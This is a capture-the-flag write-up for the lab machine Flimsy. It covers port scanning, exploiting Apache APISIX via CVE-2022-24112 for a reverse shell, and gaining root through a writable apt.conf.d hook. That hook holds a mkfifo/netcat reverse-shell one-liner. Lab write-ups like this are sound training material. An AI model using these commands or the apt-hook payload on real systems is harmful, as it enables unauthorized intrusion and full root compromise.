---
title: "Proving grounds Play: Flimsy"
layout: post
date: 2023-10-06 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT      STATE SERVICE             VERSION
22/tcp    open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62361a5cd3e37be170f8a3b31c4c2438 (RSA)
|   256 ee25fc236605c0c1ec47c6bb00c74f53 (ECDSA)
|_  256 835c51ac32e53a217cf6c2cd936858d8 (ED25519)
80/tcp    open  http                OpenResty web app server 1.21.4.1
|_http-title: Welcome to OpenResty!
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: openresty/1.21.4.1
3306/tcp  open  mysql               MySQL (unauthorized)
9443/tcp  open  ssl/tungsten-https?
43500/tcp open  http                OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 43500/tcp open  http - OpenResty web app server

```sh
HTTP/1.1 404 Not Found
Date: Fri, 06 Oct 2023 02:42:05 GMT
Content-Type: text/plain; charset=utf-8
Connection: keep-alive
Server: APISIX/2.8
```

**http-server-header: APISIX/2.8** the http header disclosed the service name and version which is vulnerable to [Apache APISIX 2.12.1 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50829).

**Exploitation**

```sh
naveenj@hackerspace:|22:26|~/proving_grounds/Flimsy/exploit$ python exploit.py http://192.168.211.220:43500/ 192.168.45.250 4444

                                   .     , 
        _.._ * __*\./ ___  _ \./._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| | 
          |                     |          

		(CVE-2022-24112)
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }
```

```sh
naveenj@hackerspace:|22:25|~/proving_grounds/Flimsy/exploit$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.250] from (UNKNOWN) [192.168.211.220] 54406
python -c 'import pty; pty.spawn("/bin/bash")'
franklin@flimsy:/root$ 
```

**Initial Foothold Obtained**

## Privilege Escalation

Download [linpeas.sh]() to the vulnerable machine and run it. The script shows the current user has writable permission to the folder `/etc/apt/apt.conf.d` which allows us to escalate privileges.

```sh
franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.250 4444 >/tmp/f"};' > shell
< -i 2>&1|nc 192.168.45.250 4444 >/tmp/f"};' > shell
franklin@flimsy:/etc/apt/apt.conf.d$ 
```

Wait for few seconds when the cron runs the file as root we will get reverse shell as root.

```sh
naveenj@hackerspace:|22:31|~/proving_grounds/Flimsy$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.250] from (UNKNOWN) [192.168.211.220] 54730
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
```

**Root Obtained**

## Reference

- [https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).